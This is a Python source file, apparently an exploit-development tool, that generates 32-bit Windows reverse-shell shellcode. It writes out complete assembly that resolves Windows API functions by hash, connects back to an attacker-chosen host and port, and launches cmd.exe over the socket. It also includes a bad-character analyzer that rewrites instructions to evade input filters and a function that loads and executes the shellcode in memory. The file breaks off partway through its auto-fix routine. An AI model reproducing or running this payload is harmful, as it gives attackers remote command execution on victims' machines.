#!/usr/bin/env python3


import sys
import argparse
import struct
import re
from typing import List, Set, Tuple, Optional, Dict

try:
    import keystone as ks
    from keystone import KsError
except ImportError:
    print("[!] Error: keystone-engine not found. Install with: pip install keystone-engine")
    sys.exit(1)

try:
    from capstone import Cs, CS_ARCH_X86, CS_MODE_32
except ImportError:
    print("[!] Error: capstone not found. Install with: pip install capstone")
    sys.exit(1)


# ANSI Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


class InstructionAlternatives:
    """Suggests alternative instructions when bad characters are found"""

    @staticmethod
    def suggest_mov_alternatives(dst: str, src: str, bad_chars: Set[int]) -> List[Tuple[str, str]]:
        """Suggest alternatives for MOV instructions"""
        alternatives = []

        # Try push/pop technique
        alt_code = f"push {src}\npop {dst}"
        if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
            alternatives.append((
                alt_code,
                f"Use push/pop instead of direct mov"
            ))

        # Try xchg if registers
        if src in ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'esp', 'ebp'] and \
           dst in ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'esp', 'ebp']:
            # Can only use xchg if we can save the original value
            pass

        # Try lea (Load Effective Address) for some cases
        if '[' not in src and ']' not in src:
            try:
                # Check if src is a register
                if src in ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'esp', 'ebp']:
                    alt_code = f"lea {dst}, [{src}]"
                    if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                        alternatives.append((
                            alt_code,
                            f"Use LEA (Load Effective Address) instead of MOV"
                        ))
            except:
                pass

        return alternatives

    @staticmethod
    def suggest_immediate_value_alternatives(reg: str, value: int, bad_chars: Set[int]) -> List[Tuple[str, str]]:
        """Suggest alternatives for loading immediate values that contain bad chars"""
        alternatives = []

        # Determine register size
        is_byte_reg = reg.endswith('l') or reg.endswith('h')  # al, cl, dl, bl, ah, ch, dh, bh
        is_word_reg = reg.endswith('x') and len(reg) == 2  # ax, bx, cx, dx, si, di, bp, sp

        if is_byte_reg:
            value = value & 0xFF
            value_bytes = struct.pack('<B', value)
            bit_mask = 0xFF
        elif is_word_reg:
            value = value & 0xFFFF
            value_bytes = struct.pack('<H', value)
            bit_mask = 0xFFFF
        else:
            value = value & 0xFFFFFFFF
            value_bytes = struct.pack('<I', value)
            bit_mask = 0xFFFFFFFF

        # Check if the value itself has bad chars
        if not any(b in bad_chars for b in value_bytes):
            return []

        # Try NOT technique
        not_value = (~value) & bit_mask

        # Check if NOT value has badchars (need to check all bytes in the instruction)
        if is_byte_reg:
            # For byte ops, only the byte value matters
            not_bytes = bytes([not_value & 0xFF])
        elif is_word_reg:
            not_bytes = struct.pack('<H', not_value)
        else:
            not_bytes = struct.pack('<I', not_value)

        if not any(b in bad_chars for b in not_bytes):
            alt_code = f"mov {reg}, {hex(not_value)}\nnot {reg}"
            if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                alternatives.append((
                    alt_code,
                    f"Use NOT with {hex(not_value)} to get {hex(value)}"
                ))

        # Try NEG technique
        neg_value = (~value + 1) & bit_mask

        if is_byte_reg:
            neg_bytes = bytes([neg_value & 0xFF])
        elif is_word_reg:
            neg_bytes = struct.pack('<H', neg_value)
        else:
            neg_bytes = struct.pack('<I', neg_value)

        if not any(b in bad_chars for b in neg_bytes):
            alt_code = f"mov {reg}, {hex(neg_value)}\nneg {reg}"
            if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                alternatives.append((
                    alt_code,
                    f"Use NEG with {hex(neg_value)} to get {hex(value)}"
                ))

        # Try XOR + ADD/SUB decomposition (only for larger registers)
        if not is_byte_reg:
            for split in range(1, min(value, 0xFFFF)):
                part1 = split
                part2 = value - split

                if is_word_reg:
                    part1_bytes = struct.pack('<H', part1 & 0xFFFF)
                    part2_bytes = struct.pack('<H', part2 & 0xFFFF)
                else:
                    part1_bytes = struct.pack('<I', part1 & 0xFFFFFFFF)
                    part2_bytes = struct.pack('<I', part2 & 0xFFFFFFFF)

                if not any(b in bad_chars for b in part1_bytes) and \
                   not any(b in bad_chars for b in part2_bytes):
                    alt_code = f"xor {reg}, {reg}\nadd {reg}, {hex(part1)}\nadd {reg}, {hex(part2)}"
                    if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                        alternatives.append((
                            alt_code,
                            f"Decompose {hex(value)} into {hex(part1)} + {hex(part2)}"
                        ))
                        break

        return alternatives[:3]  # Return top 3 alternatives

    @staticmethod
    def suggest_memory_offset_alternatives(base_reg: str, offset: int, bad_chars: Set[int]) -> List[Tuple[str, str]]:
        """Suggest alternatives for memory access with bad char offsets"""
        alternatives = []
        offset_byte = offset & 0xFF

        if offset_byte not in bad_chars:
            return []

        # Try inc/dec technique
        for adjust in range(1, 128):
            adjusted_offset = (offset + adjust) & 0xFF
            if adjusted_offset not in bad_chars:
                alt_code = f"sub {base_reg}, {adjust}\n; Use [{base_reg}+{hex(adjusted_offset)}] now\n; Then: add {base_reg}, {adjust}"
                alternatives.append((
                    alt_code,
                    f"Adjust {base_reg} by {adjust}, use offset {hex(adjusted_offset)}, then restore"
                ))
                break

            adjusted_offset = (offset - adjust) & 0xFF
            if adjusted_offset not in bad_chars:
                alt_code = f"add {base_reg}, {adjust}\n; Use [{base_reg}+{hex(adjusted_offset)}] now\n; Then: sub {base_reg}, {adjust}"
                alternatives.append((
                    alt_code,
                    f"Adjust {base_reg} by -{adjust}, use offset {hex(adjusted_offset)}, then restore"
                ))
                break

        return alternatives

    @staticmethod
    def _has_badchars(asm_code: str, bad_chars: Set[int]) -> bool:
        """Check if assembly code contains bad characters"""
        try:
            ks_engine = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
            encoding, _ = ks_engine.asm(asm_code)
            if encoding:
                return any(b in bad_chars for b in encoding)
        except KsError:
            return True
        return False

    @staticmethod
    def suggest_shl_alternatives(reg: str, shift_amount: str, bad_chars: Set[int]) -> List[Tuple[str, str]]:
        """Suggest alternatives for SHL instructions with bad chars"""
        alternatives = []

        # Try XCHG technique to use a different register
        temp_regs = ['ebx', 'ecx', 'edx', 'esi', 'edi']
        if reg in temp_regs:
            temp_regs.remove(reg)

        for temp_reg in temp_regs:
            alt_code = f"xchg {reg}, {temp_reg}\nshl {temp_reg}, {shift_amount}\nxchg {reg}, {temp_reg}"
            if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                alternatives.append((
                    alt_code,
                    f"Use XCHG to shift in {temp_reg} instead (avoids bad byte in 'shl {reg}, {shift_amount}')"
                ))
                break

        # Try using ADD instead for small shifts
        try:
            shift_val = int(shift_amount.replace('0x', ''), 16)
            if shift_val <= 4:  # Only practical for small shifts
                alt_code = ""
                for _ in range(shift_val):
                    alt_code += f"add {reg}, {reg}\n"
                alt_code = alt_code.rstrip()
                if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                    alternatives.append((
                        alt_code,
                        f"Use repeated ADD instead of shift (doubles value each time)"
                    ))
        except:
            pass

        return alternatives

    @staticmethod
    def suggest_shr_alternatives(reg: str, shift_amount: str, bad_chars: Set[int]) -> List[Tuple[str, str]]:
        """Suggest alternatives for SHR instructions with bad chars"""
        alternatives = []

        # Try XCHG technique
        temp_regs = ['ebx', 'ecx', 'edx', 'esi', 'edi']
        if reg in temp_regs:
            temp_regs.remove(reg)

        for temp_reg in temp_regs:
            alt_code = f"xchg {reg}, {temp_reg}\nshr {temp_reg}, {shift_amount}\nxchg {reg}, {temp_reg}"
            if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                alternatives.append((
                    alt_code,
                    f"Use XCHG to shift in {temp_reg} instead (avoids bad byte in 'shr {reg}, {shift_amount}')"
                ))
                break

        return alternatives

    @staticmethod
    def analyze_instruction(mnemonic: str, op_str: str, bad_chars: Set[int]) -> List[Tuple[str, str]]:
        """Analyze an instruction and suggest alternatives if it has bad chars"""
        alternatives = []

        # Parse the instruction
        parts = op_str.split(',') if ',' in op_str else [op_str]

        # PUSH immediate alternatives
        if mnemonic == 'push' and len(parts) == 1:
            value_str = parts[0].strip()

            # Check if it's an immediate value
            if value_str.startswith('0x') or value_str.startswith('-'):
                try:
                    value = int(value_str, 16) if 'x' in value_str else int(value_str)

                    # PUSH uses opcode 0x68 for dword, 0x6A for byte
                    # If these are badchars or the immediate has badchars, use MOV+PUSH
                    temp_regs = ['eax', 'ebx', 'ecx', 'edx']
                    for reg in temp_regs:
                        alt_code = f"mov {reg}, {value_str}\npush {reg}"
                        if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                            alternatives.append((
                                alt_code,
                                f"Use MOV+PUSH instead of PUSH immediate (avoids badchar in PUSH opcode or immediate)"
                            ))
                            break
                except:
                    pass

        # MOV instruction alternatives
        elif mnemonic == 'mov' and len(parts) == 2:
            dst = parts[0].strip()
            src = parts[1].strip()

            # Special case: mov reg, esp (commonly has badchars)
            if src == 'esp':
                alt_code = f"push esp\npop {dst}"
                if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                    alternatives.append((
                        alt_code,
                        f"Push esp then pop (avoids bad byte in 'mov {dst}, esp')"
                    ))
                # Also try LEA
                alt_code = f"lea {dst}, [esp]"
                if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                    alternatives.append((
                        alt_code,
                        f"Use LEA (Load Effective Address) instead of MOV"
                    ))

            # Check if it's an immediate value
            elif src.startswith('0x') or (src.startswith('-') and 'x' in src):
                try:
                    value = int(src, 16) if 'x' in src else int(src)
                    alts = InstructionAlternatives.suggest_immediate_value_alternatives(dst, value, bad_chars)
                    alternatives.extend(alts)
                except:
                    pass
            else:
                # Register to register or memory (but not esp, handled above)
                if src != 'esp':
                    alts = InstructionAlternatives.suggest_mov_alternatives(dst, src, bad_chars)
                    alternatives.extend(alts)

        # SHL instruction alternatives
        elif mnemonic == 'shl' and len(parts) == 2:
            reg = parts[0].strip()
            shift_amount = parts[1].strip()
            alts = InstructionAlternatives.suggest_shl_alternatives(reg, shift_amount, bad_chars)
            alternatives.extend(alts)

        # SHR instruction alternatives
        elif mnemonic == 'shr' and len(parts) == 2:
            reg = parts[0].strip()
            shift_amount = parts[1].strip()
            alts = InstructionAlternatives.suggest_shr_alternatives(reg, shift_amount, bad_chars)
            alternatives.extend(alts)

        # ROR instruction alternatives
        elif mnemonic == 'ror' and len(parts) == 2:
            reg = parts[0].strip()
            rotate_amount = parts[1].strip()
            # Try ROL with complementary rotation (32 - rotate_amount)
            try:
                rot_val = int(rotate_amount.replace('0x', ''), 16)
                rol_val = 32 - rot_val
                alt_code = f"rol {reg}, {hex(rol_val)}"
                if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                    alternatives.append((
                        alt_code,
                        f"Use ROL {hex(rol_val)} instead of ROR {hex(rot_val)} (equivalent rotation)"
                    ))
            except:
                pass

        # ADD/SUB ESP alternatives (common for stack allocation)
        elif (mnemonic == 'add' or mnemonic == 'sub') and len(parts) == 2:
            reg = parts[0].strip()
            value_str = parts[1].strip()

            if reg == 'esp' and value_str.startswith('0x'):
                try:
                    value = int(value_str, 16)

                    # Determine actual operation and value
                    if mnemonic == 'add' and value > 0xffff0000:
                        # ADD ESP with large value is actually subtracting (allocating stack space)
                        actual_op = 'sub'
                        actual_value = (0x100000000 - value) & 0xFFFFFFFF
                    elif mnemonic == 'sub':
                        actual_op = 'sub'
                        actual_value = value
                    else:
                        actual_op = mnemonic
                        actual_value = value

                    # If value > 0x7f, the instruction uses opcode 0x81
                    # To avoid 0x81, break into multiple ops with values <= 0x7f (uses opcode 0x83)
                    if actual_value > 0x7f and 0x81 in bad_chars:
                        # Break down into multiple operations using 0x7f chunks
                        num_full = actual_value // 0x7f
                        remainder = actual_value % 0x7f

                        # Don't create too many operations
                        if num_full <= 20:  # Reasonable limit
                            alt_lines = []
                            for _ in range(num_full):
                                alt_lines.append(f"{actual_op} esp, 0x7f")
                            if remainder > 0:
                                alt_lines.append(f"{actual_op} esp, {hex(remainder)}")

                            alt_code = '\n'.join(alt_lines)
                            if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                                alternatives.append((
                                    alt_code,
                                    f"Split into {len(alt_lines)} small {actual_op.upper()} operations (avoids 0x81 opcode)"
                                ))

                except:
                    pass

        # Memory access with offset - provide complete replacement
        mem_pattern = r'\[(\w+)\s*\+\s*0x([0-9a-fA-F]+)\]'
        match = re.search(mem_pattern, op_str)
        if match:
            base_reg = match.group(1)
            offset = int(match.group(2), 16)
            offset_byte = offset & 0xFF

            if offset_byte in bad_chars:
                # Try adjustments
                for adjust in range(1, 32):  # Try small adjustments
                    adjusted_offset = (offset + adjust) & 0xFF
                    if adjusted_offset not in bad_chars:
                        # Build complete replacement with the full instruction
                        # Remove size prefixes from Capstone output
                        new_op_str = re.sub(r'\b(dword|word|byte)\s+ptr\s+', '', op_str)
                        new_op_str = new_op_str.replace(f'{hex(offset)}', f'{hex(adjusted_offset)}')
                        alt_code = f"sub {base_reg}, {adjust}\n{mnemonic} {new_op_str}\nadd {base_reg}, {adjust}"
                        if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                            alternatives.append((
                                alt_code,
                                f"Adjust {base_reg} to use offset {hex(adjusted_offset)} instead of {hex(offset)}"
                            ))
                            break

                    adjusted_offset = (offset - adjust) & 0xFF
                    if adjusted_offset not in bad_chars:
                        # Remove size prefixes from Capstone output
                        new_op_str = re.sub(r'\b(dword|word|byte)\s+ptr\s+', '', op_str)
                        new_op_str = new_op_str.replace(f'{hex(offset)}', f'{hex(adjusted_offset)}')
                        alt_code = f"add {base_reg}, {adjust}\n{mnemonic} {new_op_str}\nsub {base_reg}, {adjust}"
                        if not InstructionAlternatives._has_badchars(alt_code, bad_chars):
                            alternatives.append((
                                alt_code,
                                f"Adjust {base_reg} to use offset {hex(adjusted_offset)} instead of {hex(offset)}"
                            ))
                            break

        return alternatives


class ShellcodeGenerator:
    """Generate reverse shell shellcode"""

    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport

    def _ip_to_hex(self, ip: str) -> str:
        """Convert IP address to hex format for shellcode"""
        parts = [int(p) for p in ip.split('.')]
        # Reverse for little-endian
        parts.reverse()
        return '0x' + ''.join(f'{p:02x}' for p in parts)

    def _port_to_hex(self, port: int) -> str:
        """Convert port to hex format (big-endian for network byte order)"""
        port_bytes = struct.pack('>H', port)
        return '0x' + ''.join(f'{b:02x}' for b in port_bytes)

    def _hash_function_name(self, name: str) -> int:
        """Generate hash for function name (ROR13 algorithm)"""
        edx = 0
        for c in name:
            edx = edx + ord(c)
            if c != name[-1]:
                edx = self._ror(edx, 13, 32)
        return edx & 0xFFFFFFFF

    def _ror(self, val: int, count: int, bits: int) -> int:
        """Rotate right"""
        mask = (1 << bits) - 1
        count = count % bits
        return ((val >> count) | (val << (bits - count))) & mask

    def generate_asm(self, debug: bool = False) -> str:
        """Generate the assembly code for reverse shell"""

        # Hash function names
        terminate_hash = self._hash_function_name("TerminateProcess")
        loadlibrary_hash = self._hash_function_name("LoadLibraryA")
        createprocess_hash = self._hash_function_name("CreateProcessA")
        wsastartup_hash = self._hash_function_name("WSAStartup")
        wsasocket_hash = self._hash_function_name("WSASocketA")
        wsaconnect_hash = self._hash_function_name("WSAConnect")

        ip_hex = self._ip_to_hex(self.lhost)
        port_hex = self._port_to_hex(self.lport)

        # Add int3 breakpoint if debug mode
        debug_break = "int3\n            " if debug else ""

        asm_code = f"""
        start:
            {debug_break}mov ebp, esp
            add esp, 0xfffff9f0

        find_kernel32:
            xor ecx, ecx
            mov esi, fs:[ecx+0x30]
            mov esi, [esi+0x0c]
            mov esi, [esi+0x1c]

        next_module:
            mov ebx, [esi+0x08]
            mov edi, [esi+0x20]
            mov esi, [esi]
            cmp [edi+12*2], cx
            jne next_module

        find_function_shorten:
            jmp find_function_shorten_bnc

        find_function_ret:
            pop esi
            mov [ebp+0x04], esi
            jmp resolve_symbols_kernel32

        find_function_shorten_bnc:
            call find_function_ret

        find_function:
            pushad
            mov eax, [ebx+0x3c]
            mov edi, [ebx+eax+0x78]
            add edi, ebx
            mov ecx, [edi+0x18]
            mov eax, [edi+0x20]
            add eax, ebx
            mov [ebp-4], eax

        find_function_loop:
            jecxz find_function_finished
            dec ecx
            mov eax, [ebp-4]
            mov esi, [eax+ecx*4]
            add esi, ebx

        compute_hash:
            xor eax, eax
            cdq
            cld

        compute_hash_again:
            lodsb
            test al, al
            jz compute_hash_finished
            ror edx, 0x0d
            add edx, eax
            jmp compute_hash_again

        compute_hash_finished:
        find_function_compare:
            cmp edx, [esp+0x24]
            jnz find_function_loop
            mov edx, [edi+0x24]
            add edx, ebx
            mov cx, [edx+2*ecx]
            mov edx, [edi+0x1c]
            add edx, ebx
            mov eax, [edx+4*ecx]
            add eax, ebx
            mov [esp+0x1c], eax

        find_function_finished:
            popad
            ret

        resolve_symbols_kernel32:
            push {hex(terminate_hash)}
            call [ebp+0x04]
            mov [ebp+0x10], eax
            push {hex(loadlibrary_hash)}
            call [ebp+0x04]
            mov [ebp+0x14], eax
            push {hex(createprocess_hash)}
            call [ebp+0x04]
            mov [ebp+0x18], eax

        load_ws2_32:
            xor eax, eax
            mov ax, 0x6c6c
            push eax
            push 0x642e3233
            push 0x5f327377
            push esp
            call [ebp+0x14]

        resolve_symbols_ws2_32:
            mov ebx, eax
            push {hex(wsastartup_hash)}
            call [ebp+0x04]
            mov [ebp+0x1c], eax
            push {hex(wsasocket_hash)}
            call [ebp+0x04]
            mov [ebp+0x30], eax
            push {hex(wsaconnect_hash)}
            call [ebp+0x04]
            mov [ebp+0x24], eax

        call_wsastartup:
            mov eax, esp
            xor ecx, ecx
            mov cx, 0x590
            sub eax, ecx
            push eax
            xor eax, eax
            mov ax, 0x0202
            push eax
            call [ebp+0x1c]

        call_wsasocketa:
            xor eax, eax
            push eax
            push eax
            push eax
            mov al, 0x06
            push eax
            sub al, 0x05
            push eax
            inc eax
            push eax
            call [ebp+0x30]

        call_wsaconnect:
            mov esi, eax
            xor eax, eax
            push eax
            push eax
            push {ip_hex}
            mov ax, {port_hex}
            shl eax, 0x10
            add ax, 0x02
            push eax
            push esp
            pop edi
            xor eax, eax
            push eax
            push eax
            push eax
            push eax
            add al, 0x10
            push eax
            push edi
            push esi
            call [ebp+0x24]

        create_startupinfoa:
            push esi
            push esi
            push esi
            xor eax, eax
            push eax
            push eax
            mov al, 0x80
            xor ecx, ecx
            mov cl, 0x80
            add eax, ecx
            push eax
            xor eax, eax
            push eax
            push eax
            push eax
            push eax
            push eax
            push eax
            push eax
            push eax
            push eax
            mov al, 0x44
            push eax
            push esp
            pop edi

        create_cmd_string:
            mov eax, 0xff9a879b
            neg eax
            push eax
            push 0x2e646d63
            push esp
            pop ebx

        call_createprocessa:
            mov eax, esp
            xor ecx, ecx
            mov cx, 0x390
            sub eax, ecx
            push eax
            push edi
            xor eax, eax
            push eax
            push eax
            push eax
            inc eax
            push eax
            dec eax
            push eax
            push eax
            push ebx
            push eax
            call [ebp+0x18]

        exec_shellcode:
            xor ecx, ecx
            push ecx
            push 0xffffffff
            call [ebp+0x10]
        """

        return asm_code


class BadcharAnalyzer:
    """Analyze shellcode for bad characters and suggest alternatives"""

    @staticmethod
    def parse_badchars(bad_chars: List[str]) -> Set[int]:
        """Parse badchars from multiple formats:
        1. Space-separated hex: ['00', '20', 'e0']
        2. Backslash-x format: ['\\x00\\x20\\xe0'] or actual bytes
        3. Mixed format
        """
        parsed = set()

        for bc_input in bad_chars:
            # Remove quotes if present
            bc_str = bc_input.strip("'\"")

            # Check if it's actual bytes (from shell expansion of \x)
            if len(bc_str) > 0 and all(ord(c) < 256 for c in bc_str):
                # Check if it contains non-printable characters (likely actual bytes)
                has_nonprintable = any(ord(c) < 32 or ord(c) > 126 for c in bc_str)

                if has_nonprintable:
                    # These are actual bytes from \x expansion
                    for byte in bc_str:
                        parsed.add(ord(byte))
                    continue

            # Check if it contains \\x format (escaped backslash-x)
            if '\\x' in bc_str:
                # Handle formats like '\\x00\\x20\\xe0'
                import re
                hex_values = re.findall(r'\\x([0-9a-fA-F]{2})', bc_str)
                for hex_val in hex_values:
                    try:
                        parsed.add(int(hex_val, 16))
                    except ValueError:
                        print(f"{Colors.RED}[!] Invalid bad char: {hex_val}{Colors.END}")
            else:
                # Handle simple hex format like '00', '20', 'e0'
                try:
                    parsed.add(int(bc_str, 16))
                except ValueError:
                    print(f"{Colors.RED}[!] Invalid bad char: {bc_str}{Colors.END}")

        return parsed

    def __init__(self, bad_chars: List[str]):
        self.bad_chars: Set[int] = self.parse_badchars(bad_chars)

    def assemble(self, asm_code: str) -> Optional[bytes]:
        """Assemble the code using keystone"""
        try:
            ks_engine = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
            encoding, _ = ks_engine.asm(asm_code)
            if encoding:
                return bytes(encoding)
        except KsError as e:
            print(f"[!] Assembly error: {e}")
            return None

    def disassemble(self, shellcode: bytes) -> List:
        """Disassemble shellcode using capstone"""
        cs = Cs(CS_ARCH_X86, CS_MODE_32)
        return list(cs.disasm(shellcode, 0))

    def analyze(self, shellcode: bytes) -> Tuple[bool, List[Dict]]:
        """Analyze shellcode for bad characters"""
        instructions = self.disassemble(shellcode)
        has_badchars = False
        results = []

        for insn in instructions:
            insn_badchars = []
            bytecode_display = []

            for byte in insn.bytes:
                if byte in self.bad_chars:
                    has_badchars = True
                    insn_badchars.append(byte)
                    bytecode_display.append(f"{Colors.RED}{byte:02x}{Colors.END}")
                else:
                    bytecode_display.append(f"{byte:02x}")

            bytecode_str = ' '.join(bytecode_display)

            # Get alternatives if bad chars found
            alternatives = []
            if insn_badchars:
                alternatives = InstructionAlternatives.analyze_instruction(
                    insn.mnemonic, insn.op_str, self.bad_chars
                )

            results.append({
                'address': insn.address,
                'bytes': insn.bytes,
                'bytecode_display': bytecode_str,
                'mnemonic': insn.mnemonic,
                'op_str': insn.op_str,
                'has_badchar': len(insn_badchars) > 0,
                'badchars': insn_badchars,
                'alternatives': alternatives
            })

        return has_badchars, results

    def print_analysis(self, results: List[Dict], show_all: bool = False):
        """Print the analysis with colors and suggestions"""
        print(f"\n{Colors.BOLD}{'='*100}{Colors.END}")
        print(f"{Colors.BOLD}SHELLCODE ANALYSIS{Colors.END}")
        print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")

        found_badchars = False

        for result in results:
            if result['has_badchar'] or show_all:
                status = f"{Colors.RED}[BAD]{Colors.END}" if result['has_badchar'] else f"{Colors.GREEN}[ OK]{Colors.END}"

                print(f"{status} {result['address']:04x}: {result['bytecode_display']:40s} {result['mnemonic']:8s} {result['op_str']}")

                if result['has_badchar']:
                    found_badchars = True
                    badchar_list = ', '.join([f"{Colors.RED}\\x{bc:02x}{Colors.END}" for bc in result['badchars']])
                    print(f"      {Colors.YELLOW}└─ Bad chars found: {badchar_list}{Colors.END}")

                    if result['alternatives']:
                        print(f"      {Colors.CYAN}└─ Alternative instructions:{Colors.END}")
                        for i, (alt_code, explanation) in enumerate(result['alternatives'], 1):
                            print(f"         {Colors.MAGENTA}{i}){Colors.END} {Colors.CYAN}{explanation}{Colors.END}")
                            for line in alt_code.split('\n'):
                                if line.strip() and not line.strip().startswith(';'):
                                    print(f"            {Colors.WHITE}{line.strip()}{Colors.END}")
                                elif line.strip():
                                    print(f"            {Colors.YELLOW}{line.strip()}{Colors.END}")
                    print()

        if not found_badchars:
            print(f"{Colors.GREEN}{Colors.BOLD}✓ No bad characters found in shellcode!{Colors.END}\n")
        else:
            print(f"{Colors.RED}{Colors.BOLD}✗ Bad characters detected - see suggestions above{Colors.END}\n")


def print_assembly_with_hex(asm_code: str, bad_chars: Set[int]):
    """Print assembly code with hex bytes alongside"""
    from keystone import Ks, KS_ARCH_X86, KS_MODE_32, KsError

    ks_engine = Ks(KS_ARCH_X86, KS_MODE_32)

    # Split into lines and process each
    lines = asm_code.strip().split('\n')
    offset = 0

    for line in lines:
        line = line.strip()

        # Skip empty lines
        if not line:
            print()
            continue

        # Check if it's a label (ends with :)
        if line.endswith(':'):
            print(f"{Colors.CYAN}{line}{Colors.END}")
            continue

        # Try to assemble the line
        try:
            # Remove comments for assembly
            asm_line = line.split('//')[0].strip()
            asm_line = asm_line.split(';')[0].strip()

            if not asm_line:
                continue

            encoding, _ = ks_engine.asm(asm_line)

            if encoding:
                # Format hex bytes with badchar highlighting
                hex_bytes = ""
                for byte in encoding:
                    if byte in bad_chars:
                        hex_bytes += f"{Colors.RED}{byte:02x}{Colors.END} "
                    else:
                        hex_bytes += f"{byte:02x} "

                # Format: offset | hex bytes | instruction
                hex_part = hex_bytes.ljust(30)  # Pad for alignment (accounting for color codes)

                # Calculate actual display length (without ANSI codes)
                display_len = sum(1 for c in hex_bytes if c not in '\033[0123456789;m')
                padding_needed = max(0, 24 - display_len)
                hex_part = hex_bytes + " " * padding_needed

                print(f"{Colors.YELLOW}{offset:04x}{Colors.END}  {hex_part}  {Colors.GREEN}{asm_line}{Colors.END}")
                offset += len(encoding)
            else:
                # Couldn't assemble - just show the line
                print(f"      {'':24}  {Colors.GREEN}{asm_line}{Colors.END}")

        except KsError:
            # If assembly fails, just print the line without hex
            print(f"      {'':24}  {Colors.GREEN}{line}{Colors.END}")


def execute_shellcode(shellcode: bytes):
    """Execute shellcode in the current process (Windows only)"""
    if sys.platform != 'win32':
        print(f"{Colors.RED}[!] Shellcode execution is only supported on Windows{Colors.END}")
        return

    if struct.calcsize("P") * 8 != 32:
        print(f"{Colors.RED}[!] Shellcode execution requires 32-bit Python{Colors.END}")
        print(f"    Current Python: {struct.calcsize('P') * 8}-bit")
        return

    try:
        import ctypes

        print(f"\n{Colors.YELLOW}[*] Allocating memory for shellcode...{Colors.END}")
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(shellcode)),
            ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
            ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
        )

        print(f"{Colors.GREEN}[+] Memory allocated at: {hex(ptr)}{Colors.END}")

        buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr),
            buf,
            ctypes.c_int(len(shellcode))
        )

        print(f"{Colors.CYAN}[*] Shellcode copied to memory{Colors.END}")
        print(f"{Colors.YELLOW}[!] Shellcode address: {hex(ptr)}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Attach debugger now if needed, then press ENTER to execute...{Colors.END}")
        input()

        print(f"{Colors.CYAN}[*] Executing shellcode...{Colors.END}")
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_int(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0))
        )

        ctypes.windll.kernel32.WaitForSingleObject(
            ctypes.c_int(ht),
            ctypes.c_int(-1)
        )

    except Exception as e:
        print(f"{Colors.RED}[!] Error executing shellcode: {e}{Colors.END}")


def apply_auto_fix(asm_code: str, results: List[Dict], bad_chars: Set[int], args) -> Optional[bytes]:
    """
    Apply automatic fixes to assembly code based on suggestions.
    Returns the fixed shellcode bytes, or None if fixing failed.
    """
    from keystone import Ks, KS_ARCH_X86, KS_MODE_32

    # Build a map of instructions that need fixing
    # Key: (mnemonic, op_str), Value: replacement code
    fix_map = {}

    print(f"{Colors.CYAN}[*] Building fix map from suggestions...{Colors.END}")

    for result in results:
        if result['has_badchar'] and result['alternatives']:
            # Get the first alternative
            alt_code, explanation = result['alternatives'][0]

            instruction_key = f"{result['mnemonic']} {result['op_str']}"
            fix_map[instruction_key] = {
                'original': instruction_key,
                'replacement': alt_code,
                'explanation': explanation
            }

            print(f"{Colors.YELLOW}  - Will replace: {Colors.END}{instruction_key}")
            print(f"{Colors.GREEN}    With: {Colors.END}{alt_code.replace(chr(10), ' → ')}")

    if not fix_map:
        print(f"{Colors.YELLOW}[*] No automatic fixes available{Colors.END}")
        return None

    print(f"\n{Colors.CYAN}[*] Applying fixes to assembly code...{Colors.END}")

    # Parse and modify assembly code
    lines = asm_code.strip().split('\n')
    fixed_lines = []
    fixes_applied = 0
    ks_engine = Ks(KS_ARCH_X86, KS_MODE_32)

    for line in lines:
        original_line = line
        line_stripped = line.strip()

        # Preserve empty lines and labels
        if not line_stripped or line_stripped.endswith(':'):
            fixed_lines.append(original_line)
            continue

        # Remove comments
        asm_line = line_stripped.split('//')[0].strip()
        asm_line = asm_line.split(';')[0].strip()

        if not asm_line:
            fixed_lines.append(original_line)
            continue

        # Try to assemble to get mnemonic and operands
        try:
            encoding, _ = ks_engine.asm(asm_line)

            if encoding:
                # Disassemble to normalize the instruction
                from capstone import Cs, CS_ARCH_X86, CS_MODE_32
                cs = Cs(CS_ARCH_X86, CS_MODE_32)
                disasm = list(cs.disasm(bytes(encoding), 0))

                if disasm:
                    insn = disasm[0]
                    instruction_key = f"{insn.mnemonic} {insn.op_str}"

                    # Check if this instruction needs fixing
                    if instruction_key in fix_map:
                        fix_info = fix_map[instruction_key]

                        # Get indentation from original line
                        indent = len(original_line) - len(original_line.lstrip())
                        indent_str = ' ' * indent

                        # Add comment showing original instruction (use # for Keystone compatibility)
                        fixed_lines.append(f"{indent_str}# Was: {asm_line}")

                        # Add replacement code with proper indentation
                        for fix_line in fix_info['replacement'].split('\n'):
                            if fix_line.strip():
                                fixed_lines.append(f"{indent_str}{fix_line.strip()}")

                        fixes_applied += 1
